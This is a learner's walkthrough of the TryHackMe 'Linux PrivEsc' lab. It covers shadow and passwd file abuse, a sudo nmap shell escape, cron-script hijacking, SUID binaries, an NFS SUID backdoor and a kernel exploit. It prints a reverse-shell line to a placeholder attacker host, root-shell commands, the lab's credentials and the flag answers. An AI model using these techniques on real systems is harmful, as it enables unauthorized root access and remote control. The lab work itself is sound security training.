Linux PrivEsc - TryHackMe Lab Walkthrough

Lab name - Linux PrivEsc
Platform - TryHackMe
Category - Linux Privilege Escalation
Difficulty - Medium
Status - Completed 100%
Date - 02-03-2026

Author
- Nitesh Verma
- Cyber Security and Ethical Hacking Learner
- GitHub - CyberNiteshHub

Overview

- Linux PrivEsc is a practical privilege escalation lab on TryHackMe.
- The lab demonstrates multiple techniques used to escalate privileges on a Linux system.
- A vulnerable Debian virtual machine is provided.
- The objective is to analyze misconfigurations and weaknesses in the system.
- By exploiting these weaknesses we can escalate privileges and access protected files.

Lab Objective

- Learn how attackers escalate privileges after gaining initial access.
- Practice real-world Linux enumeration techniques.
- Identify weak file permissions and misconfigurations.
- Understand how services, SUID binaries, cron jobs, and kernel exploits can lead to root access.

Initial Access

- The lab provides SSH credentials.

Credentials used

user : user
password : password321

- Using these credentials we connect to the target system.

Example command

ssh user@target-ip

Enumeration

- After gaining access the first step is enumeration.
- System information and available privileges are checked.

Important commands used

- whoami
- id
- uname -a
- sudo -l
- ls -la
- find / -perm -4000 2>/dev/null

These commands help identify potential privilege escalation vectors.

Weak File Permissions - Readable /etc/shadow

- The system has weak file permissions.
- The /etc/shadow file is readable by the user.

Example command

cat /etc/shadow

- Password hashes can be extracted from this file.
- These hashes can potentially be cracked offline.

Weak File Permissions - Writable /etc/shadow

- In another scenario the shadow file is writable.
- This allows modification of password hashes.

- By replacing a hash with a known password hash we can gain root access.

Weak File Permissions - Writable /etc/passwd

- If /etc/passwd is writable a new root user can be added.

Example

- Create a new user entry with UID 0.

This gives administrative privileges.

Sudo Privilege Escalation

- Some binaries may be allowed to run with sudo.

Example command

sudo -l

- If nmap is allowed with sudo it can be abused to spawn a root shell.

Example technique

sudo nmap --interactive
!sh

This gives a root shell.

Cron Job Misconfigurations

- Cron jobs run automated scripts with elevated privileges.

Example cron configuration

root /home/karen/backup.sh
root /tmp/test.py

- If these scripts are writable by the user they can be modified.

Example

echo "bash -i >& /dev/tcp/attacker-ip/6666 0>&1" >> script.sh

- When cron executes the script it opens a reverse shell.

SUID Binaries

- SUID binaries run with the permissions of their owner.

Find SUID binaries using

find / -perm -4000 2>/dev/null

- Some binaries can be abused to spawn a root shell.

Reference resource

GTFOBins

This website lists binaries that can be exploited for privilege escalation.

NFS Misconfiguration

- The system exports directories using NFS.

Example command

showmount -e target-ip

Example output

/home/ubuntu/sharedfolder
/tmp
/home/backup

- If a writable directory is exported we can mount it locally.

Example

mkdir /tmp/backdoor
mount -o rw target-ip:/tmp /tmp/backdoor

- A malicious SUID binary can be placed in this directory.

Example steps

gcc -static nfs.c -o nfs
chmod +s nfs

- Running this binary provides root privileges.

Kernel Exploits

- The kernel version is checked.

Example

uname -a

- If the kernel version is vulnerable a local exploit can be used.

Example vulnerability

Linux Kernel 3.13 overlayfs privilege escalation

Exploit used

37292.c

Steps

wget exploit-file
gcc 37292.c -o exploit
./exploit

- This results in root access.

Privilege Escalation Result

- After successful exploitation root privileges are obtained.

Verification

whoami

Output

root

Flags Collected

Flag 1

THM-402028394

Flag 2

THM-9349843

Flag 3

THM-736628929

Flag 4

THM-383000283

Tools and Techniques Used

- Linux command line enumeration
- Password hash extraction
- Sudo privilege abuse
- Cron job exploitation
- SUID binary exploitation
- NFS misconfiguration abuse
- Kernel exploitation

Skills Learned

- Linux privilege escalation techniques
- Identifying weak permissions
- Exploiting misconfigured services
- Using SUID binaries for privilege escalation
- Understanding cron job exploitation
- Using kernel exploits to gain root access

Practical Importance

- Demonstrates real-world privilege escalation techniques.
- Shows how misconfigurations can compromise system security.
- Highlights the importance of proper file permissions and system hardening.

Screenshots

Screenshots in the screenshots folder demonstrate

- System enumeration
- Shadow file access
- Kernel exploit execution
- SUID binary exploitation
- NFS mount and backdoor creation
- Root shell access
- Flag collection

Notes

- This lab was completed inside the TryHackMe training environment.
- All actions were performed for educational purposes only.
- No real systems were targeted during this exercise.

Conclusion

- Linux PrivEsc is an excellent lab for learning privilege escalation.
- It demonstrates multiple real-world attack techniques.
- Completing this lab significantly improves Linux security analysis and exploitation skills.
